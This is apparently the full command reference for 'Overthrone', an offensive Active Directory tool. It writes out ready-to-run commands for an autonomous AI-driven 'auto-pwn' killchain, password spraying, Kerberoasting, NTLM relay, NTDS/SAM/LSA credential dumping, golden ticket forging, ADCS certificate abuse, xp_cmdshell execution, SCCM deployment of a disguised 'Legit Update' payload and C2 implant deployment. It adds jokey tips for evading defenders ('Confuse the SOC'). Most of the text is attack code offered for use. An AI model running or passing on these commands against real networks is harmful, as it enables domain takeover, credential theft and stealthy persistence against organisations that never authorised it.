# Command List

Every command works as both `overthrone <cmd>` and `ovt <cmd>`. We use `ovt` because life is short and keystrokes are precious.

<p align="center">
  <b>Autopwn</b><br/>
  <a href="#ovt-auto-pwn---the-hold-my-beer-button">auto-pwn</a> &nbsp;·&nbsp;
  <a href="#ovt-wizard---interactive-guided-mode">wizard</a>
</p>

<p align="center">
  <b>Enumeration</b><br/>
  <a href="#ovt-enum---quick-enumeration-by-target-type">enum</a> &nbsp;·&nbsp;
  <a href="#ovt-reaper---full-ad-enumeration-engine">reaper</a> &nbsp;·&nbsp;
  <a href="#ovt-rid---rid-cycling">rid</a> &nbsp;·&nbsp;
  <a href="#ovt-scan---port-scanner">scan</a> &nbsp;·&nbsp;
  <a href="#ovt-laps---laps-password-reading">laps</a> &nbsp;·&nbsp;
  <a href="#ovt-gpp---gpp-password-decryption">gpp</a>
</p>

<p align="center">
  <b>Kerberos &amp; Credentials</b><br/>
  <a href="#ovt-kerberos---kerberos-operations">kerberos</a> &nbsp;·&nbsp;
  <a href="#ovt-spray---password-spraying">spray</a> &nbsp;·&nbsp;
  <a href="#ovt-crack---hash-cracking">crack</a> &nbsp;·&nbsp;
  <a href="#ovt-dump---credential-dumping">dump</a> &nbsp;·&nbsp;
  <a href="#ovt-secrets---offline-secrets-dumping">secrets</a>
</p>

<p align="center">
  <b>Lateral Movement &amp; Execution</b><br/>
  <a href="#ovt-exec---remote-command-execution">exec</a> &nbsp;·&nbsp;
  <a href="#ovt-shell---interactive-remote-shell">shell</a> &nbsp;·&nbsp;
  <a href="#ovt-smb---smb-operations">smb</a> &nbsp;·&nbsp;
  <a href="#ovt-move---lateral-movement--trust-mapping">move</a> &nbsp;·&nbsp;
  <a href="#ovt-mssql---mssql-operations">mssql</a>
</p>

<p align="center">
  <b>Persistence &amp; Certificates</b><br/>
  <a href="#ovt-forge---ticket-forging--persistence">forge</a> &nbsp;·&nbsp;
  <a href="#ovt-adcs---adcs-certificate-abuse-esc1-esc8">adcs</a> &nbsp;·&nbsp;
  <a href="#ovt-ntlm---ntlm-relay--poisoning">ntlm</a> &nbsp;·&nbsp;
  <a href="#ovt-graph---attack-graph-engine">graph</a>
</p>

<p align="center">
  <b>Infrastructure &amp; Misc</b><br/>
  <a href="#ovt-c2---c2-framework-integration">c2</a> &nbsp;·&nbsp;
  <a href="#ovt-sccm---sccmmecm-abuse">sccm</a> &nbsp;·&nbsp;
  <a href="#ovt-plugin---plugin-system">plugin</a> &nbsp;·&nbsp;
  <a href="#ovt-report---engagement-reporting">report</a> &nbsp;·&nbsp;
  <a href="#ovt-doctor---environment-diagnostics">doctor</a> &nbsp;·&nbsp;
  <a href="#ovt-tui---interactive-terminal-ui">tui</a> &nbsp;·&nbsp;
  <a href="#ovt-completions---shell-tab-completion">completions</a>
</p>

---

## Global Flags

These work on every single command:

| Flag | Short | Env Var | What it does |
|---|---|---|---|
| `--dc-host` | `-H` | `OT_DC_HOST` | Domain Controller IP or hostname. Also accepts `--dc` and `--dc-ip` because we're not monsters. |
| `--domain` | `-d` | `OT_DOMAIN` | Target domain (e.g., `corp.local`). The kingdom you're about to audit. |
| `--username` | `-u` | `OT_USERNAME` | Domain username. The key to the front door. |
| `--password` | `-p` | `OT_PASSWORD` | Password. Hidden from env output because we have manners. |
| `--nt-hash` | | `OT_NT_HASH` | NTLM hash for Pass-the-Hash. The hash IS the password. |
| `--ticket` | | `KRB5CCNAME` | Kerberos ticket cache file. For the "I already have a ticket" crowd. |
| `--auth-method` | `-A` | | Auth method: `password` (default), `hash`, `ticket`. Pick your poison. |
| `--verbose` | `-v` | | Verbosity: `-v` info, `-vv` debug, `-vvv` trace (prepare for a wall of text). |
| `--output` | `-o` | | Output format: `text`, `json`, `csv`. Default: `text`. |
| `--outfile` | `-O` | | Save output to file. For when you need receipts. |

---

## `ovt auto-pwn` - The "Hold My Beer" Button

The full autonomous killchain. Goes from "I have creds" to "I own everything" while you watch it happen in real time. Now with **Q-Learning AI** that gets smarter every engagement and actually shows its work - every step prints the stage, noise level, Q-state, action decision (explore vs exploit), Q-value, and reward. The final report has a kill-chain completion graphic, credential tables, loot summaries, and an audit trail. No more staring at a blank terminal hoping something is happening.

```bash
# Basic - let the AI figure it out
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Stealth mode - the ninja approach (low-noise, extra jitter)
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --stealth

# Dry run - plan the heist without pulling the trigger
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --dry-run

# Full Q-Learning with persistent brain across engagements
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' \
  --adaptive hybrid --q-table ./engagement_brain.json

# Stop at enumeration only (recon goal)
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' \
  --target recon --max-stage enumerate

# Run a specific playbook instead of goal-driven AI
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' \
  --playbook full-auto-pwn

# NTLM hash auth - because the hash IS the password
ovt auto-pwn -H 10.10.10.1 -d corp.local -u admin --nt-hash aad3b435b51404ee:8846f7eaee8fb117
```

| Flag | Default | What it does |
|---|---|---|
| `--target`, `-t` | `Domain Admins` | Goal: `"Domain Admins"`, `"ntds"`, `"recon"`, a hostname, or a username. What do you want to own today? |
| `--method`, `-m` | `auto` | Exec method: `auto`, `psexec`, `smbexec`, `wmiexec`, `winrm`. Auto picks the best one like a sommelier for lateral movement. |
| `--config`, `-C` | none | Path to a TOML engagement config file. Loads DC, domain, auth, targets, adaptive mode, stealth, and jitter from file. Flags on the CLI override config values. |
| `--resume` | none | Path to a session JSON file saved by a previous run. Deserializes `EngagementState` and restarts the runner from the last completed step index. |
| `--stealth` | `false` | Low-noise mode. Skips noisy attacks, adds jitter. For when the SOC is actually awake. |
| `--dry-run` | `false` | Plan only, no execution. See the whole attack plan without committing any career-limiting moves. |
| `--max-stage` | `loot` | Stop at a stage: `enumerate`, `attack`, `escalate`, `lateral`, `loot`, `cleanup`. Like a volume knob for destruction. |
| `--adaptive` | `hybrid` | AI engine: `heuristic` (rule-based), `qlearning` (pure RL), `hybrid` (best of both - recommended). |
| `--q-table` | `q_table.json` | Path to persist Q-learning brain. Reuse across engagements - your AI gets smarter every time. |
| `--jitter-ms` | `1000` | Milliseconds of random delay between steps. Higher = stealthier = slower = more coffee. |
| `--ldaps` | `false` | Use LDAP over SSL (port 636). For the security-conscious DC. |
| `--timeout` | `30` | Per-step timeout in seconds. Some DCs are slow. Some are just rude. |
| `--playbook` | none | Run a named playbook: `full-recon`, `roast-and-crack`, `delegation-abuse`, `rbcd-chain`, `coerce-and-relay`, `lateral-pivot`, `dc-sync-dump`, `golden-ticket`, `full-auto-pwn`. |

Aliases: `ovt auto`, `ovt autopwn`

**The Killchain Stages:**

```
 ENUMERATE → ATTACK → ESCALATE → LATERAL → LOOT → CLEANUP
    🔍          ⚔️        📈         🔀       💰       🧹
  Users       Roast     Dump LSA   PsExec   DCSync   Remove
  Comps       ADCS      Dump SAM   WinRM    NTDS     Traces
  Groups      Spray     Crack      WMI      Golden
  Trusts      RBCD      Cred Reuse SmbExec  Report
  GPOs        Deleg     Check Admin
  Shares
```

The Q-Learner tracks which attacks work best in which situations and optimizes future runs. It's like Netflix recommendations, but for privilege escalation. Now it also tells you what it's thinking - every step shows the encoded state (stage/creds/DA/admins/stealth/ε), the action it chose, the Q-value backing that decision, whether it's exploring (trying new things) or exploiting (doing what worked before), and the reward it got. The final report includes a kill-chain pipeline showing which stages completed (✓) and which failed (✗), a per-stage stats table, a credential table with source and admin status, a loot summary, and the full audit trail. You can finally watch the AI work instead of trusting the vibes.

---

## `ovt wizard` - Interactive Guided Mode

The autopwn with guardrails. Pauses after each stage for operator review. Supports checkpoints so you can resume if your VPN drops.

```bash
# Start a new wizard session
ovt wizard --target "Domain Admins" --dc-host 10.10.10.1 -d corp.local -u student -p 'Lab123!'

# Resume from checkpoint (your VPN dropped again, didn't it?)
ovt wizard --resume ./checkpoints/wiz_20260218_210530.json

# Skip enumeration - load state from a previous run
ovt wizard --target DA --skip-enum --from-file enum.json

# Fully automated - no pauses, just vibes
ovt wizard --target DA --dc-host 10.10.10.1 -d corp.local -u jsmith -p 'Pass!' --no-pause
```

| Flag | Default | What it does |
|---|---|---|
| `--target`, `-t` | required | Goal: `"Domain Admins"`, `"ntds"`, hostname, username |
| `--resume` | | Resume from checkpoint JSON file |
| `--checkpoint-dir` | `./checkpoints` | Directory for checkpoint files |
| `--skip-enum` | `false` | Skip enumeration (requires `--from-file`) |
| `--from-file` | | Load previous enumeration state JSON |
| `--no-pause` | `false` | Don't pause between stages (fully automated) |
| `--no-auto-crack` | `false` | Don't prompt for hash cracking |
| `--pause-timeout` | `300` | Seconds before auto-continuing (0 = wait forever) |
| `--max-stage` | `loot` | Maximum stage to reach |
| `--exec-method`, `-m` | `auto` | Preferred execution method |
| `--stealth` | `false` | Low-noise mode |
| `--dry-run` | `false` | Plan only |
| `--jitter-ms` | `1000` | Jitter between operations |
| `--ldaps` | `false` | Use LDAPS |
| `--timeout` | `30` | Per-step timeout (seconds) |

---

## `ovt reaper` - Full AD Enumeration Engine

The "tell me everything" command. Runs all enumeration modules against the DC via LDAP.

```bash
# Run all modules
ovt reaper --dc-ip 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Run specific modules only
ovt reaper --dc-ip 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' \
  --modules users,computers,groups,acls

# Big domain? Increase page size
ovt reaper --dc-ip 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --page-size 1000
```

| Flag | Default | What it does |
|---|---|---|
| `--dc-ip` | | Domain Controller IP (also accepts `--dc`, `--dc-host`) |
| `--modules`, `-m` | all | Comma-separated list: `users`, `computers`, `groups`, `acls`, `trusts`, `gpos`, etc. |
| `--page-size` | `500` | LDAP page size. Bigger = fewer round trips. Smaller = less suspicious. |

---

## `ovt enum` - Quick Enumeration by Target Type

Enumerate specific AD object types without running the full reaper engine.

```bash
ovt enum users -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt enum computers -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt enum groups -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt enum spns -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt enum delegations -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt enum all -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# With filters
ovt enum users -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --filter "admin"
ovt enum users -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --include-disabled
```

| Flag | Default | What it does |
|---|---|---|
| `--filter` | | LDAP filter string to narrow results |
| `--include-disabled` | `false` | Include disabled accounts in results |

| Target | What it finds |
|---|---|
| `users` | All domain users. The guest list. |
| `computers` | All machine accounts. The hardware census. |
| `groups` | Groups & memberships. The org chart of doom. |
| `trusts` | Domain trusts. Who trusts whom (and shouldn't). |
| `spns` | Kerberoastable service accounts. The cracking shopping list. |
| `asrep` | AS-REP roastable accounts. Someone unchecked a box. |
| `delegations` | Constrained, unconstrained, RBCD. Delegation = impersonation. |
| `gpos` | Group Policy Objects. Where the misconfigurations live. |
| `all` | Everything above. YOLO. |

---

## `ovt kerberos` - Kerberos Operations

Aliases: `ovt krb`, `ovt roast`

```bash
# Kerberoast - extract TGS hashes for offline cracking
ovt kerberos roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt kerberos roast --spn MSSQLSvc/db01.corp.local  # Target a specific SPN

# AS-REP Roast - no pre-auth required = free hashes
ovt kerberos asrep-roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt kerberos asrep-roast --userlist users.txt  # From a user list

# Request a TGT (proof of authentication)
ovt kerberos get-tgt -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Request a TGS for a specific SPN
ovt kerberos get-tgs --spn cifs/dc01.corp.local -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
```

---

## `ovt smb` - SMB Operations

```bash
# List shares on a target
ovt smb shares --target 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Check admin access
ovt smb admin --targets 10.10.10.1,10.10.10.2 -d corp.local -u admin -p 'Admin!'

# Spider shares for juicy files (.kdbx, .key, .pem, .ps1, .rdp)
ovt smb spider --target 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt smb spider --target 10.10.10.1 --extensions ".config,.xml,.txt,.sql"

# Download a file from a share
ovt smb get --target 10.10.10.1 --path "SYSVOL/corp.local/Policies/passwords.xml"

# Upload a file to a share
ovt smb put --target 10.10.10.1 --local payload.exe --remote "C$/Windows/Temp/payload.exe"
```

---

## `ovt exec` - Remote Command Execution

```bash
# Auto-detect best method
ovt exec --target 10.10.10.50 --command "whoami /all" -d corp.local -u admin -p 'Pass!'

# Force a specific method
ovt exec --target 10.10.10.50 --command "ipconfig /all" --method psexec
ovt exec --target 10.10.10.50 --command "hostname" --method wmiexec
ovt exec --target 10.10.10.50 --command "net user" --method winrm
ovt exec --target 10.10.10.50 --command "dir C:\" --method smbexec
```

| Method | Protocol | Stealth | Notes |
|---|---|---|---|
| `auto` | Best available | Varies | Tries WinRM → WMI → SMB → PsExec |
| `psexec` | DCE/RPC + SMB | Low | Creates a service. Loud but reliable. The Honda Civic of lateral movement. |
| `smbexec` | SCM over SMB | Medium | Service-based. Slightly sneakier than PsExec. |
| `wmiexec` | DCOM/WMI | Medium | WMI semi-interactive. Output via SMB file. |
| `winrm` | WS-Management | High | Native Windows remote management. Blends in beautifully. |

---

## `ovt shell` - Interactive Remote Shell

Persistent remote session on a target. Like SSH, but for Windows, and scarier.

```bash
# WinRM shell (default)
ovt shell --target 10.10.10.50 -d corp.local -u admin -p 'Pass!'

# SMB-based shell
ovt shell --target 10.10.10.50 --shell-type smb

# WMI-based shell
ovt shell --target 10.10.10.50 --shell-type wmi
```

---

## `ovt graph` - Attack Graph Engine

Build, query, and export the attack relationship graph. BloodHound vibes, zero Neo4j.

```bash
# Build the graph from enumeration data
ovt graph build -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Find shortest path between two nodes
ovt graph path --from jsmith --to "Domain Admins"

# Find ALL paths to Domain Admins from a user
ovt graph path-to-da --from jsmith
# Output: 3 hops. The CISO will need to sit down.

# Load from a previously saved graph file (instead of LDAP)
ovt graph --file saved_graph.json stats
ovt graph --file saved_graph.json path-to-da --from jsmith

# Graph stats
ovt graph stats

# Export (JSON or BloodHound format)
ovt graph export --output graph.json
ovt graph export --output bloodhound.json --bloodhound
```

---

## `ovt spray` - Password Spraying

The "try one password against everyone" attack. Handle with care (and lockout awareness).

```bash
ovt spray -H 10.10.10.1 -d corp.local \
  --password 'Winter2026!' --userlist users.txt --delay 1 --jitter 0
```

| Flag | Default | What it does |
|---|---|---|
| `--password`, `-p` | required | The one password to rule them all |
| `--userlist`, `-U` | required | File with usernames (one per line) |
| `--delay` | `1` | Seconds between attempts. Respect the lockout policy. |
| `--jitter` | `0` | Random extra delay. Confuse the SOC. |

---

## `ovt dump` - Credential Dumping

```bash
# Dump SAM (local account hashes)
ovt dump --target 10.10.10.50 sam -d corp.local -u admin -p 'Pass!'

# Dump LSA secrets (service account passwords, DPAPI keys)
ovt dump --target 10.10.10.50 lsa -d corp.local -u admin -p 'Pass!'

# Dump NTDS.dit (ALL domain hashes - the motherload)
ovt dump --target 10.10.10.1 ntds -d corp.local -u da_admin -p 'DA_Pass!'

# Dump DCC2 cached credentials
ovt dump --target 10.10.10.50 dcc2 -d corp.local -u admin -p 'Pass!'
```

---

## `ovt crack` - Hash Cracking

Offline hash cracking with embedded wordlist, rules, and rayon parallelism.

```bash
# Crack a single hash (auto-detects type)
ovt crack --hash '$krb5tgs$23$*svc_sql...'

# Crack from a file
ovt crack --file kerberoast_hashes.txt

# Thorough mode with custom wordlist
ovt crack --file hashes.txt --mode thorough --wordlist /usr/share/wordlists/rockyou.txt

# Limit candidates (fast mode for quick wins)
ovt crack --file hashes.txt --mode fast --max-candidates 100000
```

| Flag | Default | What it does |
|---|---|---|
| `--hash`, `-s` | | Single hash string (auto-detects type) |
| `--file`, `-f` | | File with hashes (one per line) |
| `--mode`, `-M` | `default` | `fast` (minimal rules), `default` (balanced), `thorough` (all rules, exhaustive) |
| `--wordlist`, `-W` | embedded 10K | Custom wordlist. Default uses embedded top-10K + rules. |
| `--max-candidates` | `0` (unlimited) | Cap on total candidates to try |

---

## `ovt forge` - Ticket Forging & Persistence

The blacksmith's toolkit. Forge tickets, persist access, make blue teams cry.

```bash
# Golden Ticket - be anyone, access anything, forever
ovt forge golden --domain-sid S-1-5-21-1234... --krbtgt-hash <32hex> \
  --user Administrator --output golden.kirbi

# Silver Ticket - access one service, no DC interaction
ovt forge silver --domain-sid S-1-5-21-1234... --service-hash <32hex> \
  --spn cifs/dc01.corp.local --output silver.kirbi
```

| Subcommand | What it forges |
|---|---|
| `golden` | TGT signed with KRBTGT hash. Willy Wonka's factory pass. |
| `silver` | TGS for a specific service. Stealthier than golden - no DC needed. |

---

## `ovt adcs` - ADCS Certificate Abuse (ESC1-ESC8)

Aliases: `ovt certify`

AD Certificate Services exploitation. The gift that keeps on giving (to attackers).

```bash
# Enumerate vulnerable templates
ovt adcs enum -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt adcs enum --ca CA01.corp.local  # Target specific CA

# ESC1 - SAN abuse (the most common ADCS vuln)
ovt adcs esc1 --ca CA01 --template VulnTemplate --target-user Administrator

# ESC2 - Any purpose EKU
ovt adcs esc2 --ca CA01 --template AnyPurpose

# ESC3 - Enrollment agent abuse (two-step)
ovt adcs esc3 --ca CA01 --agent-template Agent --target-template User --target-user admin

# ESC4 - Writable template ACLs
ovt adcs esc4 --ca CA01 --template WritableTemplate

# ESC5 - Vulnerable CA config
ovt adcs esc5 --ca CA01

# ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
ovt adcs esc6 --ca CA01 --target-user Administrator

# ESC7 - ManageCA permission abuse
ovt adcs esc7 --ca CA01

# ESC8 - NTLM relay to web enrollment
ovt adcs esc8 --url https://ca01.corp.local/certsrv --target-user Administrator

# Request a certificate manually
ovt adcs request --ca CA01 --template User --san "administrator@corp.local" -o cert.pfx
```

---

## `ovt ntlm` - NTLM Relay & Poisoning

Aliases: `ovt relay`

```bash
# Capture NTLM hashes (Responder-style)
ovt ntlm capture --interface eth0 --port 445

# Relay to SMB targets
ovt ntlm relay --targets 10.10.10.50:445,10.10.10.51:445

# SMB-specific relay
ovt ntlm smb-relay --targets 10.10.10.50:445 --command "whoami"

# HTTP relay (for ADCS ESC8)
ovt ntlm http-relay --targets 10.10.10.1:80 --command "whoami"
```

---

## `ovt secrets` - Offline Secrets Dumping

Parse registry hive files offline (SAM, SECURITY, SYSTEM).

```bash
# Dump SAM hashes from hive files
ovt secrets sam --sam ./SAM --system ./SYSTEM

# Dump LSA secrets
ovt secrets lsa --security ./SECURITY --system ./SYSTEM

# Dump cached domain credentials (DCC2/mscash2)
ovt secrets dcc2 --security ./SECURITY --system ./SYSTEM
```

---

## `ovt gpp` - GPP Password Decryption

Decrypt Group Policy Preferences cpassword values. Microsoft published the AES key. We just use it.

```bash
# Decrypt from a GPP XML file
ovt gpp --file Groups.xml

# Decrypt a raw cpassword string
ovt gpp --cpassword "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+..."
```

---

## `ovt laps` - LAPS Password Reading

Read local admin passwords stored in AD (LAPS v1 plaintext + LAPS v2 encrypted via DPAPI).

```bash
# Read all LAPS passwords
ovt laps -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Read for a specific computer
ovt laps --computer WS01 -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
```

---

## `ovt rid` - RID Cycling

Aliases: `ovt rid-cycle`, `ovt rid-brute`

Enumerate users/groups via MS-SAMR. Works unauthenticated with null sessions.

```bash
# Default range (RID 500-10500)
ovt rid -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Custom range
ovt rid -H 10.10.10.1 -d corp.local --start-rid 500 --end-rid 50000

# Null session (no creds needed - if the DC allows it)
ovt rid -H 10.10.10.1 -d corp.local --null-session
```

---

## `ovt scan` - Port Scanner

Aliases: `ovt portscan`

Lightweight network reconnaissance. Not nmap, but it gets the job done.

```bash
# Scan top 1000 ports
ovt scan --targets 10.10.10.0/24

# Custom port range
ovt scan --targets 10.10.10.1 -P 1-65535

# Specific ports with timeout
ovt scan --targets 10.10.10.0/24 -P 80,443,445,3389,5985 --timeout 2000

# SYN scan (requires root/raw sockets)
ovt scan --targets 10.10.10.0/24 --scan-type syn

# ACK scan (firewall rule mapping)
ovt scan --targets 10.10.10.0/24 --scan-type ack
```

| Flag | Default | What it does |
|---|---|---|
| `--targets`, `-t` | required | Target hosts (IP, CIDR, or range) |
| `--ports`, `-P` | `top1000` | Port range: `80,443` or `1-65535` |
| `--scan-type`, `-T` | `connect` | `syn` (needs root), `connect`, `ack` (firewall mapping) |
| `--timeout` | `1000` | Timeout in milliseconds |

---

## `ovt move` - Lateral Movement & Trust Mapping

Aliases: `ovt lateral`

```bash
# Display domain trust relationships
ovt move trusts -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Find cross-domain escalation paths
ovt move escalation

# Analyze MSSQL linked server chains
ovt move mssql

# Print full trust map visualization
ovt move map
```

---

## `ovt mssql` - MSSQL Operations

Aliases: `ovt sql`

Talk to SQL Server. Execute queries. Enable xp_cmdshell. Question your life choices.

```bash
# Execute a SQL query
ovt mssql query --target 10.10.10.100 --query "SELECT @@version" -d corp.local -u sa -p 'sa'

# Query a specific database
ovt mssql query --target 10.10.10.100 --query "SELECT * FROM users" --database hr_db

# Execute OS command via xp_cmdshell
ovt mssql xp-cmd-shell --target 10.10.10.100 --command "whoami"

# Enumerate linked servers
ovt mssql linked-servers --target 10.10.10.100

# Enable xp_cmdshell (if disabled)
ovt mssql enable-xp-cmd-shell --target 10.10.10.100

# Check if xp_cmdshell is enabled
ovt mssql check-xp-cmd-shell --target 10.10.10.100
```

| Subcommand | Flags | What it does |
|---|---|---|
| `query` | `--target`, `--query`, `--database` (default: `master`) | Execute SQL query |
| `xp-cmd-shell` | `--target`, `--command` | OS command via xp_cmdshell |
| `linked-servers` | `--target` | Enumerate linked servers |
| `enable-xp-cmd-shell` | `--target` | Enable xp_cmdshell |
| `check-xp-cmd-shell` | `--target` | Check xp_cmdshell status |

---

## `ovt sccm` - SCCM/MECM Abuse

Aliases: `ovt sccm`, `ovt mecm`

```bash
# Enumerate SCCM configuration
ovt sccm enum --site-server sccm01.corp.local

# Client push abuse
ovt sccm abuse --site-server sccm01.corp.local --technique client-push

# Deploy a malicious application
ovt sccm deploy --collection "All Systems" --app-name "Legit Update" --payload ./payload.exe
```

---

## `ovt c2` - C2 Framework Integration

Connect to Cobalt Strike, Sliver, or Havoc teamservers.

```bash
# Connect to Sliver (mTLS)
ovt c2 connect sliver 10.10.10.200 31337 --config ./operator.cfg

# Connect to Cobalt Strike
ovt c2 connect cs 10.10.10.200 50050 --password 'teamserver_pass'

# Connect to Havoc
ovt c2 connect havoc 10.10.10.200 40056 --token 'api_token_here'

# Named channel + skip TLS verify
ovt c2 connect sliver 10.10.10.200 31337 --config ./operator.cfg --name ops1 --skip-verify

# Check C2 status
ovt c2 status

# Execute command on a beacon/session
ovt c2 exec <session_id> "whoami /all"
ovt c2 exec <session_id> "Get-Process" --powershell

# Deploy implant to a target
ovt c2 deploy default 10.10.10.50 http-listener

# List listeners
ovt c2 listeners default

# Disconnect
ovt c2 disconnect all
```

---

## `ovt plugin` - Plugin System

Aliases: `ovt plug`

```bash
# List loaded plugins
ovt plugin list

# Plugin info
ovt plugin info smart-spray

# Execute a plugin command
ovt plugin exec spray-smart -- --targets users.txt --password 'Winter2026!'

# Load/unload plugins
ovt plugin load ./plugins/custom_scanner.wasm
ovt plugin unload custom-scanner
ovt plugin enable custom-scanner
ovt plugin disable custom-scanner
```

---

## `ovt report` - Engagement Reporting

Turn carnage into compliance documents.

```bash
# Markdown report (for the technical team)
ovt report --input engagement.json --output report.md --format markdown

# JSON report (for automation/SIEMs)
ovt report --input engagement.json --output findings.json --format json

# PDF report (for executives who think Domain Admin is a job title)
ovt report --input engagement.json --output executive.pdf --format pdf
```

---

## `ovt doctor` - Environment Diagnostics

Aliases: `ovt check`, `ovt env`

Check dependencies, connectivity, and environment before an engagement.

```bash
# Run all checks
ovt doctor

# Specific checks
ovt doctor --checks smb,kerberos,winrm,network --dc 10.10.10.1
```

---

## `ovt tui` - Interactive Terminal UI

Aliases: `ovt ui`

Launch the full TUI with live attack graph visualization, session panels, and crawler integration.

```bash
# Start TUI with domain crawl
ovt tui --domain corp.local -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Load a previous graph
ovt tui --domain corp.local --load graph.json --crawl false
```

---

## `ovt completions` - Shell Tab Completion

Generate shell completion scripts. Source them once, tab-complete forever.

Aliases: `ovt completion`

```bash
# Print completion script to stdout
ovt completions bash
ovt completions fish
ovt completions zsh
ovt completions powershell
ovt completions elvish

# Write directly to a file
ovt completions bash --output ~/.bash_completion.d/ovt.bash
ovt completions zsh  --output ~/.zsh/completions/_ovt

# Quick setup (bash)
ovt completions bash >> ~/.bashrc && source ~/.bashrc

# Quick setup (zsh)
ovt completions zsh > "$(brew --prefix)/share/zsh/site-functions/_ovt" && compinit

# Quick setup (fish)
ovt completions fish > ~/.config/fish/completions/ovt.fish

# Quick setup (PowerShell)
ovt completions powershell >> $PROFILE
```

| Flag | What it does |
|---|---|
| `<shell>` | Required. One of: `bash`, `fish`, `zsh`, `powershell`, `elvish` |
| `--output`, `-o` | Write script to file instead of stdout |

---

## Quick Reference Card

For the "I don't read docs, I read cheat sheets" crowd:

```bash
# === RECON ===
ovt enum all -H DC -d DOMAIN -u USER -p PASS         # Enumerate everything
ovt reaper -H DC -d DOMAIN -u USER -p PASS            # Full LDAP reaper
ovt scan --targets 10.10.10.0/24                       # Port scan
ovt rid -H DC -d DOMAIN --null-session                 # RID cycling

# === KERBEROS ===
ovt kerberos roast -H DC -d DOMAIN -u USER -p PASS    # Kerberoast
ovt kerberos asrep-roast -H DC -d DOMAIN -u USER      # AS-REP Roast
ovt kerberos get-tgt -H DC -d DOMAIN -u USER -p PASS  # Get TGT
ovt crack --file hashes.txt --mode thorough            # Crack offline

# === CERTS ===
ovt adcs enum -H DC -d DOMAIN -u USER -p PASS         # Find vulnerable templates
ovt adcs esc1 --ca CA --template TPL --target-user DA  # ESC1 exploit

# === LATERAL ===
ovt exec -t TARGET -c "whoami" -d DOMAIN -u ADMIN      # Remote exec
ovt shell -t TARGET -d DOMAIN -u ADMIN -p PASS         # Interactive shell
ovt smb admin --targets 10.10.10.0/24                  # Admin check

# === LOOT ===
ovt dump -t DC ntds -d DOMAIN -u DA -p PASS            # Dump NTDS
ovt forge golden --krbtgt-hash HASH --domain-sid SID   # Golden ticket
ovt laps -H DC -d DOMAIN -u USER -p PASS               # Read LAPS

# === AUTOPWN ===
ovt auto-pwn -H DC -d DOMAIN -u USER -p PASS           # Full killchain
ovt wizard -t DA --dc-host DC -d DOMAIN -u USER        # Guided mode

# === MISC ===
ovt doctor                                              # Health check
ovt report -o report.pdf --format pdf                   # Generate report
ovt tui --domain DOMAIN                                 # Launch TUI
```
